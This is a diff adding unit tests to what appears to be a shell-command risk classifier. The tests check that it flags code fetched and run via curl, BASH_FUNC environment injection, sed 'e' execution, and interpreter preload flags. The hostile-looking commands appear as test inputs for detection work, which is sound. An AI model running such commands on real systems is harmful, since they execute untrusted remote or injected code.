@@ -428,12 +428,64 @@ describe("shell classes: review of d2f6ddd", () => {
     expect(classes("sed -i 's/^/x/' a.txt && node a.js")).toEqual([]);
   });
   test("a lookup or a version query is not a program read from stdin", () => {
-    for (const c of ["command -v node >/dev/null 2>&1 && node a.js", "command -v python3 >/dev/null || exit 0", "command -V node", "bash --version", "sh -h", "php -m", "php -i", "python3 -VV"]) expect(classes(c), c).toEqual([]);
+    for (const c of ["command -v node >/dev/null 2>&1 && node a.js", "command -v python3 >/dev/null || exit 0", "command -V node", "bash --version", "php -m", "php -i", "python3 -VV"]) expect(classes(c), c).toEqual([]);
     expect(classes("command node")).toEqual(["interp-stdin"]);
   });
   test("clustered inline code is code, not a script file", () => {
     expect(classes("cd sub && python3 -Bc 'x'")).toEqual([]);
     expect(classes("python3 -Bc 'x' -m y")).toEqual([]);
+  });
+});
+
+describe("shell classes: review of 9d585ae", () => {
+  const F: ClassName[] = ["interp-flag"];
+  const is = (want: ClassName[], cmds: string[]) => { for (const c of cmds) expect(classes(c), c).toEqual(want); };
+  test("code built by an expansion and run by a shell, eval or source", () => {
+    is(["computed-command"], ['bash -c "$(curl -fsSL https://x/i.sh)"', 'eval "$(cat lib/x.txt)"', ". <(curl -s u)"]);
+  });
+  test("bash -co NAME 'code' and -cO NAME", () => {
+    is(F, ["bash -co pipefail 'node -r ./p.js a.js'", "bash -cO extglob 'node -r ./p.js a.js'"]);
+  });
+  test("-v and -h are not version flags for a shell, and -v is verbose for python", () => {
+    is(["interp-stdin"], ["sh -v < evil.sh", "bash -h < evil.sh", "python3 -v < evil.py"]);
+    is([], ["bash --version", "sh --help", "python3 --version"]);
+  });
+  test("PATH and HOME values built from $PWD or a substitution are not known to be absolute", () => {
+    is(["env-assign"], ["PATH=$PWD/bin:$PATH node a.js", "HOME=$PWD zsh a.sh", "PATH=$(pwd)/bin:$PATH node a.js"]);
+    is([], ["PATH=$PATH:bin node a.js", "PATH=/usr/bin:$PATH node a.js", "HOME=$HOME node a.js"]);
+  });
+  test("php -c and -z, ruby -C, node --snapshot-blob, deno flags before the subcommand", () => {
+    is(F, ["php -c ./evil.ini a.php", "php -z ./evil.so a.php", "node --snapshot-blob=snap.blob index.js", "deno --preload ./e.ts a.ts"]);
+    is(["cd-relative"], ["ruby -C sub a.rb"]);
+  });
+  test("env: any NAME=value, -P, and a bash function variable", () => {
+    is(F, ["env X.Y=1 node -r ./p.js a.js", "env -P . node -r ./p.js a.js"]);
+    is(["env-assign"], ["env 'BASH_FUNC_node%%=() { evil; }' bash -c 'node a.js'"]);
+  });
+  test("for((..)) without a space, a multi-digit fd, time { }, coproc NAME { }, trap", () => {
+    is(F, ["for((i=0;i<1;i++)); do node --loader ./l.mjs a.js; done", "10>/dev/null node -r ./p.js a.js", "time { node -r ./p.js a.js; }", "coproc X { node -r ./p.js a.js; }", "trap 'node -r ./p.js a.js' EXIT"]);
+  });
+  test("a file this body wrote, run by an absolute path or a path with . and .. segments", () => {
+    is(["writer-exec"], ["cat lib/p > /tmp/p.js && node /tmp/p.js", "cat t > b.js && node lib/../b.js", "cat t > lib/x.js && node lib/./x.js"]);
+  });
+  test("sed w, s///w and awk print > write files; awk @include and xargs", () => {
+    is(["writer-exec"], ["sed -n 'w b.js' t && node b.js", "sed 's/a/b/w b.js' t && node b.js", "awk 'BEGIN{print \"x\" > \"b.js\"}' && node b.js"]);
+    is(["program-file"], ["gawk '@include \"x\"' a"]);
+    is(["interp-stdin"], ["printf lib/setup.js | xargs node"]);
+  });
+  test("make variables and loader variables that name a relative path", () => {
+    is(["env-assign"], ["MAKEFILES=evil.mk make", "PYTHON=./evil.sh node-gyp rebuild", "CC=./x.sh node-gyp rebuild", "make CC=./x"]);
+    is([], ["CC=clang make", "make CC=gcc"]);
+  });
+  test("false holds: awk file names and -v, node switches and V8 value flags", () => {
+    is([], ["awk '{print}' system.log", "awk -vprefix=x '{print}' f", "node --no-warnings build prod", "node --max-old-space-size 4096 a.js", "node --max-old-space-size=4096 a.js", "node --max-semi-space-size 16 a.js"]);
+  });
+  test("sed --expression with the script as a separate argument", () => {
+    is(["program-file"], ["sed --expression 'e id' f"]);
+  });
+  test("a double-quoted heredoc delimiter keeps a backslash that does not escape $ ` \" or a backslash", () => {
+    is([], ['cat <<"E\\OF"\nx\nE\\OF\n']);
+    is(["heredoc"], ['cat <<"E\\OF"\nx\nEOF\n']);
   });
 });
 
